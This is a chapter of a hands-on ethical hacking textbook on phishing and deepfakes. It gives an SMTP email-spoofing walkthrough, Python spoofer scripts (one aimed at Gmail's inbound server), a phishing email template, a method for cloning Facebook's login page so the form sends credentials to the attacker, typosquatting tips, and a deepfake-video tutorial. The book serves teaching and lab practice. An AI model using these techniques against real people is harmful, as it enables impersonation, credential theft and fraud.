<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch7"><span epub:type="pagebreak" id="page_113"/><strong><span class="big">7</span><br/>PHISHING AND DEEPFAKES</strong></h2>
		<p class="verse"><em>Don’t believe anything you read on the net. Except this. Well, including this, I suppose.</em></p>
		<p class="chap-au">–Douglas Adams</p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">Hackers use <em>social engineering</em> techniques to trick victims into giving them access to their systems. Social engineering is the use of technology to psychologically influence a person’s behavior. These techniques have been used to steal passwords, destabilize governments, and rig elections.</p>
		<p class="indent">You might be familiar with social engineering attacks that attempt to bait users into taking a particular action. These are referred to as <em>phishing</em> attacks. But savvy computer users can usually identify fake emails quickly and spam filters rapidly eliminate fake emails based on content and spelling errors, meaning that poorly crafted attacks are easily detected.</p>
		<p class="indent">Yet with the proper bait, a phishing attack can be very successful. In this chapter, we’ll look at three social engineering techniques that allow hackers to create fake emails, websites, and videos, and then we’ll combine these techniques into a single coordinated attack.</p>
		<h3 class="h3" id="ch07lev1"><span epub:type="pagebreak" id="page_114"/><strong>A Sophisticated and Sneaky Social Engineering Attack</strong></h3>
		<p class="noindent">Here’s an example of an attack you could conduct using the techniques covered in this chapter. The attack begins with a hacker sending a fake email from Facebook that states the victim has been tagged in a photo. When the victim clicks the link in the email, they’re taken to a fake Facebook login screen. After attempting to log in, the victim is redirected to the correct Facebook login page and their username and password are sent to the hacker. Now the victim will be able to successfully log in, likely believing they simply entered the wrong password on their first attempt.</p>
		<p class="indent">Email-based social engineering attacks like this one can also be combined with media-based social engineering attacks. For example, a hacker might also create a voicemail or video message from a spouse telling a victim to expect a particular email or text message. Or they might create a deepfake video of a CEO instructing their employees to expect a particular email.</p>
		<h3 class="h3" id="ch07lev2"><strong>Faking Emails</strong></h3>
		<p class="noindent">To understand how attackers can send fake emails, you must first understand how email works in general. <a href="ch07.xhtml#ch7fig1">Figure 7-1</a> shows an overview of the email exchange process.</p>
		<div class="image" id="ch7fig1">
			<img alt="image" src="../images/ch07fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-1: The email exchange process</em></p>
		<p class="indent">Email relies on a collection of <em>mail servers</em>, and each email domain (for example, <em>@virginia.edu</em>) is associated with one or more mail servers that sort incoming messages into their appropriate mailboxes and sends outgoing messages to other mail servers. When <em><a href="mailto:alice@companyX.com">alice@companyX.com</a></em> wants to send an email to <em><a href="mailto:john@companyY.com">john@companyY.com</a></em>, she uploads her email to her company’s mail server, which then places the email in its outgoing queue. Once the email <span epub:type="pagebreak" id="page_115"/>reaches the head of the outgoing queue, the server does a DNS lookup to discover the IP address of John’s mail server.</p>
		<p class="indent">Next, Alice’s mail server sets up a TCP connection with John’s mail server, and uses the <em>simple mail transfer protocol (SMTP)</em> to send the email to John’s mail server. SMTP is a text-based protocol that allows mail servers to exchange information. A secure version of the protocol, SMTPS, exchanges messages over a TLS connection.</p>
		<p class="indent">When John’s mail server receives Alice’s email, it places the email in John’s mailbox. John then retrieves the email by connecting to his company’s mail server.</p>
		<h4 class="h4" id="ch07lev3"><strong><em>Performing a DNS Lookup of a Mail Server</em></strong></h4>
		<p class="noindent">You can perform a DNS lookup of someone’s mail server yourself by using the <span class="literal">dig</span> command. For example, let’s discover the IP address and URL of the <em><a href="http://gmail.com">gmail.com</a></em> mail server. To do this, we use the <span class="literal">mx</span> flag to display the MX (mail exchanger) record, which contains information about the mail server:</p>
		<p class="programs">  kali@kali:~$ <span class="codestrong1">dig mx gmail.com</span><br/>
        ...<br/>
  ;; ANSWER SECTION:<br/><span class="ent">➊</span> gmail.com.3435INMX5 gmail-smtp-in.l.google.com.<br/>
  gmail.com.3435INMX10 alt1.gmail-smtp-in.l.google.com.<br/>
  gmail.com.3435INMX40 alt4.gmail-smtp-in.l.google.com.<br/>
        ...</p>
		<p class="indent">There are multiple mail servers and each server is assigned a priority. The mail server with the lowest number <span class="ent">➊</span> is given the highest priority and is one that you should connect to first. So <em>gmail-smtp-in.l.google.com</em> is an SMTP server that accepts a connection on port 25.</p>
		<h4 class="h4" id="ch07lev4"><strong><em>Communicating with SMTP</em></strong></h4>
		<p class="noindent">An SMTP communication reads just like any conversation–with some special codes, of course. Let’s take a look at these messages to better understand how the protocol works.</p>
		<p class="indent">It’s illegal and unethical to hack machines you don’t own (and, of course, we’ll want to hack SMTP eventually), so let’s use the SMTP server running on port 25 of our Metasploitable virtual machine. Ensure that Kali Linux and pfSense are running. Next, launch the Metasploitable virtual machine and then log in to it using the username <strong>msfadmin</strong> and password <strong>msfadmin</strong>. Run the following command to obtain its IP address:</p>
		<p class="programs">msfadmin@metasploitable:~$ <span class="codestrong1">ifconfig eth0</span><br/><br/>
   eth0    Link encap:Ethernet  HWaddr 00:17:9A:0A:F6:44<br/><span class="ent">➊</span> inet addr: 192.168.1.101   Bcast:192.168.1.255  Mask:255.255.255.0</p>
		<p class="indent"><span epub:type="pagebreak" id="page_116"/>The value after <span class="literal">inet addr:</span> <span class="ent">➊</span> is the IP address. Remember, this address may be different in your lab environment.</p>
		<p class="indent">Use <span class="literal">netcat</span> on the Kali Linux virtual machine to connect to port 25 on that IP address by running the following command:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">nc 192.168.1.101 25</span><br/>Server: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)</p>
		<p class="indent">After the connection is established, the server will respond with a <span class="literal">220</span> code indicating that you’ve successfully connected. Here, you can also see that the Metasploitable machine uses an open source Postfix mail server that supports the <em>extended simple mail transfer protocol (ESMTP)</em>.</p>
		<p class="indent">Once you’ve received the <span class="literal">220</span> message, respond with a <span class="literal">HELO</span> message. Yeah, it’s really “HELO” (not a typo). I’ve marked the client request with the tag <em>Client:</em> and the server’s response with the tag <em>Server:</em> for clarity. These tags are not part of the exchange.</p>
		<p class="indent">This is where the deception begins. In your <span class="literal">HELO</span> message, you can pretend to be anyone you want. Here, we pretend to be a <em>secret.gov</em> server:</p>
		<p class="programs">Client: HELO secret.gov<br/>Server: 250 metasploitable.localdomain</p>
		<p class="indent">When the server receives our message, it should respond with a <span class="literal">250</span> message confirming receipt. Some mail servers include a fun message like “gmail server at your service.” Now you also know the identity of the server to which you’re sending the mail.</p>
		<p class="indent">Now the deception deepens: we pretend to be sending mail from <span class="literal">head @secret.gov</span>:</p>
		<p class="programs">Client: MAIL FROM: &lt;head@secret.gov&gt;<br/>Server: 250 2.1.0 Ok</p>
		<p class="indent">The server responds with a <span class="literal">250 Ok</span> message. Great. It believes us. Next, we send a <span class="literal">RCPT TO:</span> message indicating our email’s recipient. Let’s say we’re sending a message to the <span class="literal">sys</span> account:</p>
		<p class="programs">Client: RCPT TO:&lt;sys&gt;<br/>Server: 250 2.1.5 Ok</p>
		<p class="indent">If the Metasploitable machine had an associated domain, like <em>virginia.edu</em>, we would have sent <span class="literal">RCPT TO: &lt;sys@virgina.edu&gt;</span> instead.</p>
		<p class="indent">If this email address is registered with the server, it will respond with a <span class="literal">250 Ok</span> message, as shown here. Otherwise, it would respond with an error code.</p>
		<p class="indent">You might already be thinking of ways a hacker could exploit this behavior to recover a list of emails from the server, but put those thoughts aside for now. It’s time to send the body of the email. The <span class="literal">DATA</span> command indicates to the server that we’re ready to upload our email.</p>
		<p class="programs"><span epub:type="pagebreak" id="page_117"/>Client: DATA<br/>Server: 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</p>
		<p class="indent">The server responds with a <span class="literal">354</span> message, which indicates that it is ready to receive the email. It also includes instructions on how to end your email. In this case, you’d end your email with <span class="literal">&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span>, where <span class="literal">&lt;CR&gt;</span> and <span class="literal">&lt;LF&gt;</span> represent the <em>carriage return</em> and <em>line feed</em> characters, respectively. These are legacy characters from the days when computer keyboards closely resembled typewriters. (SMTP was invented in 1982, and is still used by modern mail servers like Gmail despite its age.)</p>
		<p class="indent">Here’s the email we send:</p>
		<p class="programs">Client:<br/>
    From: "The Boss Lady" &lt;head@secret.gov&gt;<br/>
    Subject: Hello SYS<br/>
    Click This link &lt;a href="url"&gt;link text&lt;/a&gt;<br/>
    Your Enemy, someone<br/>
    .<br/>Server: 250 2.0.0 Ok: queued as B16A9CBFC<br/>Client: QUIT<br/>Server: 221 2.0.0 Bye.</p>
		<p class="indent">To verify that the spoofed email was correctly received, run the following command on your Metasploitable virtual machine to read <span class="literal">sys</span>’s mailbox:</p>
		<p class="programs">msfadmin@metasploitable:~$ <span class="codestrong1">sudo cat /var/spool/mail/sys</span></p>
		<p class="indent">You should see a message from <span class="literal">head@secret.gov</span> with the message body you entered:</p>
		<p class="programs">...<br/>From: "The Boss lady" &lt;head@secret.gov&gt;<br/>Subject: Hello SYS<br/>Message-Id: &lt;20200718011936.45737CBFC@metasploitable.localdomain&gt;<br/>Date: Sat, 17 Jul 2022 21:19:14 -0400 (EDT)<br/>To: undisclosed-recipients:;<br/><br/><br/>Click This link &lt;a href="url"&gt;link text &lt;/a&gt;<br/>Your Enemy,<br/>someone</p>
		<p class="indent">Congratulations! You’ve sent your first fake email.</p>
		<h4 class="h4" id="ch07lev5"><strong><em>Writing an Email Spoofer</em></strong></h4>
		<p class="noindent">Executing the SMTP protocol by hand can be tedious, so let’s write a short Python program that sends a fake email using the procedure you just learned. On your Kali Linux virtual machine, create a new folder on the desktop named <span epub:type="pagebreak" id="page_118"/><em>spoofer</em>. Inside the <em>spoofer</em> folder, create a Python file named <em>espoofer.py</em>, open it in an IDE or text editor of your choice and then copy the following code, which executes SMTP over a TCP connection.</p>
		<p class="programs">import sys, socket<br/><br/>size = 1024<br/><br/>def sendMessage(smtpServer, port, fromAddress,<br/>
                toAddress,message):<br/>
    IP = smtpServer<br/>
    PORT = int(port)<br/><br/>
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
    s.connect((IP, PORT))  # Open socket on port<br/>
    print(s.recv(size).decode())  # display response<br/>
 <span class="ent">➊</span> s.send(b'HELO '+ fromAddress.split('@')[1].encode() +b'\n')<br/>
 <span class="ent">➋</span> print(s.recv(size).decode())<br/>
    # send MAIL FROM:<br/>
    s.send(b'MAIL FROM:&lt;'+ fromAddress.encode() + b'&gt;\n')<br/>
    print(s.recv(size).decode())<br/>
    # send RCPT TO:<br/>
    s.send(b'RCPT TO:&lt;'+ toAddress.encode() + b'&gt;\n')<br/>
    print(s.recv(size).decode())<br/>
    s.send(b"DATA\n")  # send DATA<br/>
    print(s.recv(size).decode())<br/>
    s.send(message.encode() + b'\n')<br/>
 <span class="ent">➌</span> s.send(b'\r\n.\r\n')<br/>
    print(s.recv(size).decode())  # display response<br/>
    s.send(b'QUIT\n')  # send QUIT<br/>
    print(s.recv(size).decode())  # display response<br/>
    s.close()<br/><br/><br/>
    def main(args):<br/>
     <span class="ent">➍</span> smtpServer = args[1]<br/>
        port = args[2]<br/>
        fromAddress = args[3]<br/>
        toAddress = args[4]<br/>
        message = args[5]<br/>
        sendMessage(smtpServer, port, fromAddress,<br/>
                    toAddress, message)<br/><br/><br/>
    if __name__ == "__main__":<br/>
        main(sys.argv)</p>
		<p class="indent"><span epub:type="pagebreak" id="page_119"/>We send our first message to the server, pretending to be the mail server associated with the from address <span class="ent">➊</span>. Next, we print out the response we received from the server <span class="ent">➋</span>. We continue sending data before ending the message <span class="ent">➌</span> by sending <span class="literal">&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span>. Python represents the <span class="literal">&lt;CR&gt;</span> and <span class="literal">&lt;LF&gt;</span> characters with <span class="literal">\r</span> and <span class="literal">\n</span>. Finally, we read in the command line parameters that specify our target mail server and headers for our email <span class="ent">➍</span>.</p>
		<p class="indent">Now let’s run the Python program. Open the terminal and navigate to the folder containing <em>espoofer.py</em>:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">cd ~/Desktop/spoofer</span></p>
		<p class="indent">Run the <em>espoofer.py</em> program with these arguments:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">python3 espoofer.py <span class="codeitalic">&lt;Metasploitable IP address&gt;</span> 25 hacking@virginia.edu sys</span><br/><span class="codestrong1">"Hello from the other side! "</span></p>
		<p class="indent">This will send an email from <span class="literal">hacking@virginia.edu</span> to <span class="literal">sys</span> with the message “Hello from the other side!” in the messages body.</p>
		<p class="indent">This attack won’t always work; some SMTP servers may implement defensive features, such as <em>domain-based message authentication, reporting, and conformance (DMARC)</em>, which allows the receiving SMTP server to verify that SMTP messages are coming from an authorized IP address. Still, there are always other ways to be tricky. For example, you could register a domain name that is similar to the domain you’re attacking. Tools like URLCrazy allow you to quickly search for domains similar to the one you are attacking. To reduce spam, some ISPs have been blocking packets on port 25. So if you want to audit a system outside of your virtual environment, you’ll need to route your traffic through a <em>virtual private network (VPN)</em>.</p>
		<h4 class="h4" id="ch07lev6"><strong><em>Spoofing SMTPS Emails</em></strong></h4>
		<p class="noindent">In the previous examples, we sent SMTP messages over an unencrypted channel. Now let’s look at SMTPS, which sends the SMTP messages over a channel encrypted using TLS. Our Metasploitable virtual machine doesn’t support SMTPS, so we’ll connect to a Gmail SMTP server that does and send ourselves a fake email.</p>
		<p class="indent">If your ISP allows, or if you have a VPN, you can use the command <span class="literal">openssl s_client</span> with Google’s SMTP server (<em>gmail-smtp-in.l.google.com</em>), which accepts incoming SMTP connections from other SMTP servers. After you’re connected, you can manually execute the exchange and send yourself a spoofed email.</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">openssl s_client -starttls smtp -connect gmail-smtp-in.l.google.</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">com:25 -crlf -ign_eof</span></p>
		<p class="indent">Now let’s write a program that uses SMTPS to interface with mail servers. Some servers support only encrypted communication over SMTPS, so it may not always be possible to use unencrypted SMTP to spoof. Python’s <span class="literal">smtplib</span> library encapsulates the functionality we discussed earlier in this chapter. <span epub:type="pagebreak" id="page_120"/>We’ll use it to send a fake email using SMTPS. Open your preferred text editor, copy the following code, and call your program <em>secureSpoofer.py</em>:</p>
		<p class="programs">   from smtplib import SMTP<br/>
   from email.mime.text import MIMEText<br/>
   from email.mime.multipart import MIMEMultipart<br/><br/>
   receiver = 'victimEmail'<br/>
   receiver_name = 'Victim Name'<br/>
   fromaddr = 'Name &lt;spoofed@domain.com&gt;'<br/>
   smtp_server = "gmail-smtp-in.l.google.com"<br/><br/>
   msg = MIMEMultipart()<br/>
   msg['Subject'] = "Urgent"<br/>
   msg['From'] = fromaddr<br/><br/><span class="ent">➊</span> with open('template.html', 'r') as file:<br/>
       message = file.read().replace('\n', '')<br/>
       message = message.replace("{{FirstName}}", receiver_name)<br/>
       msg.attach(MIMEText(message, "html"))<br/>
       with SMTP(smtp_server, 25) as smtp:<br/>
         <span class="ent">➋</span> smtp.starttls()<br/>
            smtp.sendmail(fromaddr, receiver, msg.as_string())</p>
		<p class="indent">Instead of manually entering an email message, we’ll read it from a file <span class="ent">➊</span>. This will allow us to use email templates, which make the fake emails look more realistic. These templates are written in HTML, and you can find them for free by searching online for “email phishing templates.” After you’ve loaded the message, start a TLS session <span class="ent">➋</span>.</p>
		<p class="indent">Here is a sample email template (<em>template.html</em>):</p>
		<p class="programs">&lt;html&gt;<br/>
&lt;head&gt;<br/>
&lt;/head&gt;<br/>
&lt;body style="background-color:#A9A9A9"&gt;<br/>
&lt;div class="container" &gt;<br/>
   &lt;div class="container" style="background-color:#FFF;"&gt;<br/>
     &lt;br&gt;&lt;br&gt;<br/>
  <span class="ent">➊</span> &lt;h1&gt;Breaking News, {{FirstName}}&lt;/h1&gt;<br/>
  <span class="ent">➋</span> &lt;h3&gt;You have been identified in a Deep Fake!&lt;/h3&gt;<br/>
     &lt;p&gt;A Deep Fake video of you has been uploaded to YouTube yesterday and<br/>
     already has over 2,400 views. &lt;/p&gt;<br/>
     &lt;p&gt;Click the link below to view the video and take it down! &lt;/p&gt;<br/>
  <span class="ent">➌</span> &lt;a href="https://www.google.com"&gt;Your video&lt;/a&gt;<br/>
     &lt;br&gt;&lt;br&gt;&lt;hr&gt;<br/>
     &lt;p&gt;Best regards,&lt;/p&gt;<br/>
     &lt;p&gt;The Deep Fake Association&lt;/p&gt;<br/>
     &lt;p&gt;&lt;/p&gt;<br/>
   <span epub:type="pagebreak" id="page_121"/>&lt;/div&gt;<br/>
&lt;/div&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;</p>
		<p class="indent">Make it your own by editing the text <span class="ent">➋</span>, name <span class="ent">➊</span>, and link <span class="ent">➌</span>. Great: you know how to send a fake email.</p>
		<h3 class="h3" id="ch07lev7"><strong>Faking Websites</strong></h3>
		<p class="noindent">The email we’ll send as part of our attack will include a link that directs the user to a fake site. To convince users to enter their credentials, we’ll make this site a clone of some popular website’s login page, which is surprisingly easy to do.</p>
		<p class="indent">Web pages are made up of HTML and JavaScript files. Every time a browser visits a page, it downloads a copy of these HTML and JavaScript files and uses them to render the page. When a hacker visits a login page, they also obtain a copy of those files, and by hosting these files on their own server, a hacker can display a web page that looks identical to the legitimate login page.</p>
		<p class="indent">It gets worse: by modifying their local copy of the page’s HTML or JavaScript code, a hacker could configure the page to send the victim’s username and password to the hacker instead of the site. Once a user logs in, the fake page could redirect them to the real login page, where they’ll be able to reenter their credentials and successfully log in. The victim will simply think that their first attempt failed, completely unaware that someone has stolen their password.</p>
		<p class="indent">Let’s clone the Facebook login page. Open Firefox in Kali Linux and go to <em><a href="https://www.facebook.com/">https://www.facebook.com/</a></em>. Save a copy of the page and associated resources by right-clicking the page and then selecting <strong>Save Page As</strong>, as shown in <a href="ch07.xhtml#ch7fig2">Figure 7-2</a>.</p>
		<div class="image" id="ch7fig2">
			<img alt="image" src="../images/ch07fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-2: Using Firefox to save a copy of a web page</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_122"/>Call the file <em>index.html</em> and save it to a desktop folder called <em>SocialEngineering</em>. The <em>index.html</em> page is the first page a browser opens when it accesses any web page, so by saving that page as <em>index.html</em>, users’ browsers will automatically open it when they go to your site.</p>
		<p class="indent">Now, how could you alter the web page so that it sends the user’s username and password back to the hacker? Login pages often rely on an HTML <span class="literal">&lt;form&gt;</span> tag. The following code snippet represents a basic HTML form:</p>
		<p class="programs">&lt;form action="login_service.php" method="post"&gt;<br/>
    &lt;input type="text" placeholder="Enter Username" name="uname" required&gt;<br/>
    &lt;input type="password" placeholder="Enter Password" name="pass" required&gt;<br/>
    &lt;button type="submit"&gt;Login&lt;/button&gt;<br/>
&lt;/form&gt;</p>
		<p class="indent">The <span class="literal">&lt;form&gt;</span> tags often include an attribute that specifies where to send the form’s data. In this example, the data is being sent to <em>login_service.php</em>. A hacker can send the form data to themselves instead by replacing the URL in the <span class="literal">&lt;form&gt;</span> tag with their own. This will send all the form’s data to the hacker’s page. Remember anything you see in your browser can be replicated with HTML, CSS, and JavaScript. You may just need to write some extra code.</p>
		<p class="indent">Open the terminal and navigate to the folder that contains your HTML files by running the following command:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">cd ~/Desktop/SocialEngineering</span></p>
		<p class="indent">To serve this file from our own Python HTTP server, enter the following command:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo python3 -m http.server 80</span></p>
		<div class="note">
			<p class="notet"><strong><span class="notes">NOTE</span></strong></p>
			<p class="notep"><em>Ports lower than 1024 can only be opened with root permissions.</em></p>
		</div>
		<p class="indent">The Python 3 <span class="literal">https.server</span> utility is preinstalled on your Kali Linux virtual machine. To test your evil site, leave the terminal open and switch to your Ubuntu virtual machine. Next, access the fake site by opening Firefox and entering the IP address of the Kali Linux virtual machine; for example <span class="literal">192.168.1.103</span>. If you’ve done everything correctly, you should see your fake copy of the Facebook login page like the one in <a href="ch07.xhtml#ch7fig3">Figure 7-3</a>.</p>
		<div class="image" id="ch7fig3">
			<span epub:type="pagebreak" id="page_123"/>
			<img alt="image" src="../images/ch07fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-3: Fake Facebook login page hosted on the Kali Linux virtual machine</em></p>
		<p class="indent">If you look closely at the URL bar, you’ll notice that the page isn’t encrypted, as Facebook would normally be, and that the URL is not <em><a href="http://facebook.com">facebook.com</a></em>. Not to worry: hackers have deceptive ways of hiding this, too. For example, a hacker could register a domain similar to Facebook’s. I checked the GoDaddy domain search and found that domains like <em>fecabeok.com</em> or <em>facebvvk.com</em> were still available. A user would need to look carefully at the URL bar to discover that they’ve been duped. Would you notice something wrong if you quickly glanced at <em><a href="https://wwww.fecabeok.com/">https://wwww.fecabeok.com/</a></em>? We call the act of using URLs that look like legitimate ones <em>squatting</em>. Tools like URLCrazy will help you easily identify squatting URLs.</p>
		<p class="indent">Now you know how to create a fake site. Let’s discuss how to create fake videos.</p>
		<h3 class="h3" id="ch07lev8"><strong>Creating Deepfake Videos</strong></h3>
		<p class="noindent"><em>Deepfakes</em> are counterfeit images, videos, or sounds generated by machine learning algorithms. A hacker may encourage public unrest by creating a deepfake of a public figure. Or they might attempt to steal usernames and passwords of employees by creating a deepfake of a CEO instructing their employees to use a malicious site to reset their credentials. A hacker might also create a deepfake of a voicemail from a spouse with instructions to meet them somewhere or to do something.</p>
		<p class="indent">In this section, we’ll generate a deepfake video of Bob Marley speaking like President Obama. We’ll use a machine learning model developed by Aliaksandr Siarohin and others in their paper “First Order Motion Model for Image Animation.” The model is special because it learns the movements from an input video and uses these movements to animate a picture. This makes it more efficient than earlier techniques that required users to supply the model with multiple images.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_124"/>The process has two steps. During the first step, the video is fed to a <em>key point extraction algorithm</em>, which learns the sparse collection of points needed to model facial movement in the input video. This input video is called the <em>driving video</em>, because it will be used to drive the animation of the picture. <a href="ch07.xhtml#ch7fig4">Figure 7-4</a> shows an illustration of the key points extracted from a driving video of President Obama speaking.</p>
		<div class="image" id="ch7fig4">
			<img alt="image" src="../images/ch07fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-4: Learning key points and motion from input video</em></p>
		<p class="indent">After the key points for each frame are extracted, they’re sent to a machine learning algorithm that learns how the points move. This process is called <em>motion detection</em>.</p>
		<p class="indent">During the second step, the machine learning algorithm warps the input picture and generates the animated video. <a href="ch07.xhtml#ch7fig5">Figure 7-5</a> shows an overview of the generation process.</p>
		<div class="image" id="ch7fig5">
			<img alt="image" src="../images/ch07fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-5: Animating a static image using the learned video</em></p>
		<p class="indent">Now you’ll generate your own deepfakes. You can view the generated video by visiting <em><a href="https://youtu.be/8DZHYL0qReA">https://youtu.be/8DZHYL0qReA</a></em>.</p>
		<h4 class="h4" id="ch07lev9"><strong><em>Accessing Google Colab</em></strong></h4>
		<p class="noindent">Instead of setting up our own machine learning development environment, we’ll use Google’s Colab notebooks. Google Colab is a free service that gives you access to Google’s computing infrastructure. I’ve modified Károly Zsolnai-Fehér’s open source implementation to create a simple Colab notebook that contains all the steps you’ll need to generate a deepfake video. You can follow along by opening the notebook using this link to the GitHub repository: <em><a href="https://github.com/The-Ethical-Hacking-Book/DeepFakeBob">https://github.com/The-Ethical-Hacking-Book/DeepFakeBob</a></em>.</p>
		<p class="indent">In the Colab notebook, scroll to the bottom. You should see a video like the one in <a href="ch07.xhtml#ch7fig6">Figure 7-6</a>. Press play. If the video plays, you’ve correctly configured your workplace.</p>
		<div class="image" id="ch7fig6">
			<span epub:type="pagebreak" id="page_125"/>
			<img alt="image" src="../images/ch07fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-6: A screenshot of the final static picture, driving image, and animated image.</em></p>
		<p class="indent">We’ll modify this existing program so that you can generate your own deepfakes.</p>
		<h4 class="h4" id="ch07lev10"><strong><em>Importing the Machine Learning Models</em></strong></h4>
		<p class="noindent">Begin by importing the Siarohin et al. repository into your Colab notebook. This repository contains code that will load the machine learning models that we’ll use. Click the play buttons next to the lines shown below to run these commands:</p>
		<p class="programs">!git clone https://github.com/AliaksandrSiarohin/first-order-model<br/>cd first-order-model</p>
		<p class="indent">The <span class="literal">!</span> tells the Colab notebook to run the command as a shell command. Next, connect your Google drive folder to Colab. The Colab notebook will read the driving video and target photo from the your Google drive, along with the necessary configuration files.</p>
		<p class="indent">Create a Google Drive folder called <em>DeepFake</em> and then upload your driving video and target image to this folder. The GitHub repository at <em><a href="https://github.com/The-Ethical-Hacking-Book/DeepFakeBob">https://github.com/The-Ethical-Hacking-Book/DeepFakeBob</a></em> contains an example driving video of President Obama and target picture of Bob Marley. Copy these into your <em>DeepFake</em> folder along with <em>vox-adv-cpk.pth.tar</em>. This file contains the <em>weights</em> for the models, which are the values associated with the connections in an artificial neural network. <em>Artificial neural networks</em> are computer models that attempt to model the behavior of biological neurons in the brain. When a brain learns, it forms new connections between neurons. Similarly, an artificial neural network forms new connections when it learns. A weight of 1 means that a neuron is connected to another and a weight of 0 means they aren’t connected. The weights in an artificial neural network can be any value between 0 and 1, indicating their degree of connectedness.</p>
		<p class="indent">After you’ve uploaded the files to the Google Drive folder, switch to the Colab notebook and connect your Google Drive by running the following command:</p>
		<p class="programs">from google.colab import drive<br/>drive.mount('/content/gdrive/')</p>
		<p class="indent"><span epub:type="pagebreak" id="page_126"/>The Colab notebook will ask you to obtain an authentication code. Click the link it provides and copy and paste the authentication code into the box labelled Colab. Ensure that you’ve successfully connected your workspace by running the following command on the your <em>DeepFake</em> directory:</p>
		<p class="programs">ls /content/gdrive/My\ Drive/DeepFake/<br/>Obama.mp4  bob.png   vox-adv-cpk.pth.tar</p>
		<p class="indent">If you see all three files listed, you’ve successfully uploaded the files and connected your Google Drive.</p>
		<p class="indent">Next, run the following code to import and resize the image and video:</p>
		<p class="programs"><span class="ent">➊</span> import imageio<br/>
   import numpy as np<br/>
   import matplotlib.pyplot as plt<br/>
   import matplotlib.animation as animation<br/>
   from skimage.transform import resize<br/>
   from IPython.display import HTML<br/><br/><span class="ent">➋</span> source_image = imageio.imread('/content/gdrive/My Drive/DeepFake/bob2.png')<br/>
   driving_video = imageio.mimread('/content/gdrive/My Drive/DeepFake/Obama.mp4')<br/><span class="ent">➌</span> source_image = resize(source_image, (256, 256))[..., :3]<br/>
   driving_video = [resize(frame, (256, 256))[..., :3] for frame in driving_video]</p>
		<p class="indent">We import the the libraries needed to obtain and resize the image <span class="ent">➊</span>. Next, we import the source image of Bob Marley and the driving video of President Obama <span class="ent">➋</span>. Then, we resize both the source image and driving video to 256 <em>×</em> 256 pixels <span class="ent">➌</span>. This is the image size that our model expects.</p>
		<p class="indent">Let’s load weights for the key-point detector <span class="literal">(kp\_detector)</span> and media generator models:</p>
		<p class="programs">from demo import load_checkpoints<br/>generator, kp_detector = load_checkpoints(config_path='config/vox-256.yaml',<br/>
                    checkpoint_path='/content/gdrive/My Drive/DeepFake/vox-adv-cpk.pth.tar')</p>
		<p class="indent">Loading the models can take some time. When the process completes, apply these models to detect the key points and generate the animation by running the following code block:</p>
		<p class="programs"><span class="ent">➊</span> from demo import make_animation<br/><span class="ent">➋</span> predictions = make_animation(source_image,<br/>
                          driving_video, generator,<br/>
                          kp_detector, relative=True)</p>
		<p class="indent">We import the <span class="literal">make_animation()</span> function <span class="ent">➊</span>, which applies the key-point detection and media generator models. Then, we obtain the predictions <span class="ent">➋</span>, which are the frames representing the animated picture.</p>
		<p class="indent">Now we’ll put these frames together to create the deepfake video:</p>
		<p class="programs">def display(source, driving, generated=None):<br/>
    <span epub:type="pagebreak" id="page_127"/>fig = plt.figure(figsize=(8 + 4 * (generated is not None), 6))<br/><br/>
    ims = []<br/>
    for i in range(len(driving)):<br/>
        cols = [source]<br/>
        cols.append(driving[i])<br/>
        if generated is not None:<br/>
            cols.append(generated[i])<br/>
        im = plt.imshow(np.concatenate(cols, axis=1), animated=True)<br/>
        plt.axis('off')<br/>
        ims.append([im])<br/><br/>
    ani = animation.ArtistAnimation(fig, ims, interval=50, repeat_delay=1000)<br/>
    plt.close()<br/>
    return ani<br/><br/>HTML(display(source_image, driving_video, predictions).to_html5_video())<br/>HTML(display(source_image, driving_video, predictions).to_html5_video())</p>
		<p class="indent">If you’ve done everything correctly, you should see an HTML video playing your generated video. Congratulations! You have created your first deepfake video. Now go ahead and share your video on YouTube, and don’t forget to tag this book.</p>
		<h3 class="h3" id="ch07lev11"><strong>Exercises</strong></h3>
		<p class="noindent">The following exercises are designed to extend your understanding of deepfakes and phishing by introducing voice cloning and the <em>King Phisher</em> tool. <em>Voice cloning</em> is a technique that allows a computer to mimic a person’s voice. The King Phisher tool allows you to perform phishing attacks at scale.</p>
		<h4 class="h4" id="ch07lev12"><strong><em>Voice Cloning</em></strong></h4>
		<p class="noindent">In this chapter, we generated a deepfake video. But the video only animated the picture; it didn’t generate any sound. Voice cloning techniques use machine learning to mimic a person’s voice. A group of researchers at Google have built an advanced voice cloner called Tacotron 2. You can listen to audio samples from Tacotron 2 by visiting <em><a href="https://google.github.io/tacotron/publications/tacotron2/index.html">https://google.github.io/tacotron/publications/tacotron2/index.html</a></em>. The web page also contains human and machine-generated voices side by side. Can you tell the difference?</p>
